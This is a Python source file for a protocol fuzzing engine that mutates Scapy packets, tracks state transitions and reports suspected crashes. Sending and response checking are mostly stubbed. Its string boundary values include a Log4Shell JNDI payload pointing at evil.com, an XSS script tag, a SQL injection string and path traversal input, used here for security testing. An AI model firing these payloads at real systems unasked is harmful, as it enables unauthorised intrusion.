"""Protocol fuzzing engine for security testing.

Provides capabilities for:
- Automated protocol fuzzing
- Mutation-based testing
- Crash detection and monitoring
- Anomaly detection in responses
"""
from __future__ import annotations

from typing import Any, Callable, Dict, List, Optional, Set, Tuple
from dataclasses import dataclass, field
import random
import time


@dataclass
class FuzzResult:
    """Result from a fuzzing operation."""
    test_id: int
    packet_summary: str
    sent: bool
    response_received: bool
    response_summary: Optional[str] = None
    anomaly_detected: bool = False
    crash_suspected: bool = False
    error: Optional[str] = None
    timestamp: float = field(default_factory=time.time)


class ProtocolFuzzer:
    """Fuzz protocol implementations to find vulnerabilities."""
    
    def __init__(self):
        self.fuzz_results: List[FuzzResult] = []
        self.crash_indicators: Set[str] = {
            'connection reset',
            'timeout',
            'no response',
            'malformed',
            'error',
            'exception'
        }
    
    def mutate_bytes(self, data: bytes, mutation_rate: float = 0.1) -> bytes:
        """Apply random byte mutations to data.
        
        Args:
            data: Original byte data
            mutation_rate: Probability of mutating each byte (0.0-1.0)
            
        Returns:
            Mutated byte string
        """
        mutated = bytearray(data)
        for i in range(len(mutated)):
            if random.random() < mutation_rate:
                # Random mutation strategies
                strategy = random.choice(['flip', 'random', 'zero', 'max'])
                if strategy == 'flip':
                    mutated[i] ^= 0xFF
                elif strategy == 'random':
                    mutated[i] = random.randint(0, 255)
                elif strategy == 'zero':
                    mutated[i] = 0
                elif strategy == 'max':
                    mutated[i] = 0xFF
        return bytes(mutated)
    
    def generate_boundary_values(self, field_type: str) -> List[Any]:
        """Generate boundary values for common field types.
        
        Args:
            field_type: Type of field ('int8', 'int16', 'int32', 'string', etc.)
            
        Returns:
            List of boundary test values
        """
        if field_type == 'int8':
            return [0, 1, 127, 128, 255, -1, -128]
        elif field_type == 'int16':
            return [0, 1, 32767, 32768, 65535, -1, -32768]
        elif field_type == 'int32':
            return [0, 1, 2147483647, 2147483648, 4294967295, -1, -2147483648]
        elif field_type == 'string':
            return [
                '',
                'A' * 256,
                'A' * 1024,
                'A' * 65536,
                '../' * 50,
                '%s' * 100,
                '\x00' * 100,
                '${jndi:ldap://evil.com/a}',  # Log4Shell
                '<script>alert(1)</script>',  # XSS
                "' OR '1'='1",  # SQLi
            ]
        elif field_type == 'port':
            return [0, 1, 80, 443, 8080, 32767, 65535, -1]
        else:
            return []
    
    def fuzz_packet_field(
        self,
        base_packet: Any,
        field_path: str,
        test_values: Optional[List[Any]] = None,
        dry_run: bool = True
    ) -> List[FuzzResult]:
        """Fuzz a specific field in a packet.
        
        Args:
            base_packet: Base Scapy packet
            field_path: Path to field (e.g., 'TCP.dport')
            test_values: Values to test (if None, uses boundary values)
            dry_run: If True, don't actually send packets
            
        Returns:
            List of fuzz results
        """
        from .packet_crafter import PacketCrafter
        
        results = []
        crafter = PacketCrafter()
        
        # If no test values provided, use boundary values based on field name
        if test_values is None:
            if 'port' in field_path.lower():
                test_values = self.generate_boundary_values('port')
            elif 'len' in field_path.lower() or 'size' in field_path.lower():
                test_values = self.generate_boundary_values('int32')
            else:
                test_values = self.generate_boundary_values('string')
        
        for i, val in enumerate(test_values):
            try:
                # Create fuzzed packet
                fuzzed_pkt = crafter.modify_packet(base_packet, {field_path: val})
                if fuzzed_pkt is None:
                    results.append(FuzzResult(
                        test_id=i,
                        packet_summary=f"Fuzz {field_path}={val}",
                        sent=False,
                        response_received=False,
                        error="Failed to create packet"
                    ))
                    continue
                
                # In a real implementation, would send and monitor response
                result = FuzzResult(
                    test_id=i,
                    packet_summary=fuzzed_pkt.summary() if hasattr(fuzzed_pkt, 'summary') else str(val),
                    sent=not dry_run,
                    response_received=False,  # Would check for actual response
                    anomaly_detected=False,
                    crash_suspected=False
                )
                
                results.append(result)
                
            except Exception as e:
                results.append(FuzzResult(
                    test_id=i,
                    packet_summary=f"Fuzz {field_path}={val}",
                    sent=False,
                    response_received=False,
                    error=str(e)
                ))
        
        self.fuzz_results.extend(results)
        return results
    
    def fuzz_payload(
        self,
        base_packet: Any,
        mutation_count: int = 100,
        mutation_rate: float = 0.1,
        dry_run: bool = True
    ) -> List[FuzzResult]:
        """Fuzz packet payload with random mutations.
        
        Args:
            base_packet: Base Scapy packet with payload
            mutation_count: Number of mutations to generate
            mutation_rate: Byte mutation probability
            dry_run: If True, don't send packets
            
        Returns:
            List of fuzz results
        """
        try:
            from scapy.all import Raw  # type: ignore
        except ImportError:
            return []
        
        results = []
        
        # Extract original payload
        if not base_packet.haslayer(Raw):
            return results
        
        original_payload = bytes(base_packet[Raw].load)
        
        for i in range(mutation_count):
            try:
                # Mutate payload
                mutated_payload = self.mutate_bytes(original_payload, mutation_rate)
                
                # Create new packet with mutated payload
                mutated_pkt = base_packet.copy()
                mutated_pkt[Raw].load = mutated_payload
                
                result = FuzzResult(
                    test_id=i,
                    packet_summary=f"Payload mutation {i+1}/{mutation_count}",
                    sent=not dry_run,
                    response_received=False,
                    anomaly_detected=False
                )
                
                results.append(result)
                
            except Exception as e:
                results.append(FuzzResult(
                    test_id=i,
                    packet_summary=f"Payload mutation {i+1}",
                    sent=False,
                    response_received=False,
                    error=str(e)
                ))
        
        self.fuzz_results.extend(results)
        return results
    
    def detect_anomalies(self, response_data: bytes, baseline_data: bytes) -> bool:
        """Detect anomalies in response compared to baseline.
        
        Args:
            response_data: Response bytes from fuzzed packet
            baseline_data: Expected/baseline response
            
        Returns:
            True if anomaly detected
        """
        # Simple heuristics for anomaly detection
        if not response_data:
            return True  # No response is anomalous
        
        # Check for significant size difference
        size_ratio = len(response_data) / max(len(baseline_data), 1)
        if size_ratio < 0.5 or size_ratio > 2.0:
            return True
        
        # Check for common error indicators
        response_str = response_data.decode('utf-8', errors='ignore').lower()
        for indicator in self.crash_indicators:
            if indicator in response_str:
                return True
        
        return False
    
    def get_crash_candidates(self) -> List[FuzzResult]:
        """Get fuzzing results that may indicate crashes.
        
        Returns:
            List of results with suspected crashes
        """
        return [r for r in self.fuzz_results if r.crash_suspected or r.anomaly_detected]
    
    def generate_report(self) -> Dict[str, Any]:
        """Generate fuzzing report with statistics.
        
        Returns:
            Dict with fuzzing statistics and findings
        """
        total = len(self.fuzz_results)
        sent = sum(1 for r in self.fuzz_results if r.sent)
        crashes = len(self.get_crash_candidates())
        errors = sum(1 for r in self.fuzz_results if r.error)
        
        return {
            'total_tests': total,
            'sent': sent,
            'crashes_suspected': crashes,
            'errors': errors,
            'success_rate': (sent / max(total, 1)) * 100,
            'crash_rate': (crashes / max(sent, 1)) * 100 if sent > 0 else 0,
            'results': self.fuzz_results
        }


class ProtocolStateFuzzer:
    """Stateful protocol fuzzing with session tracking."""
    
    def __init__(self):
        self.session_state: Dict[str, Any] = {}
        self.state_transitions: List[Tuple[str, str]] = []
    
    def fuzz_state_transition(
        self,
        from_state: str,
        to_state: str,
        transition_packet: Any,
        dry_run: bool = True
    ) -> FuzzResult:
        """Fuzz a state transition in a stateful protocol.
        
        Args:
            from_state: Starting state
            to_state: Expected end state
            transition_packet: Packet that triggers transition
            dry_run: If True, simulate only
            
        Returns:
            Fuzz result for this transition
        """
        # Record state transition
        self.state_transitions.append((from_state, to_state))
        
        # In a real implementation, would send packet and verify state
        result = FuzzResult(
            test_id=len(self.state_transitions),
            packet_summary=f"State: {from_state} -> {to_state}",
            sent=not dry_run,
            response_received=False
        )
        
        return result
    
    def get_state_coverage(self) -> Dict[str, int]:
        """Calculate state coverage from fuzzing.
        
        Returns:
            Dict mapping states to visit counts
        """
        coverage: Dict[str, int] = {}
        for from_state, to_state in self.state_transitions:
            coverage[from_state] = coverage.get(from_state, 0) + 1
            coverage[to_state] = coverage.get(to_state, 0) + 1
        return coverage
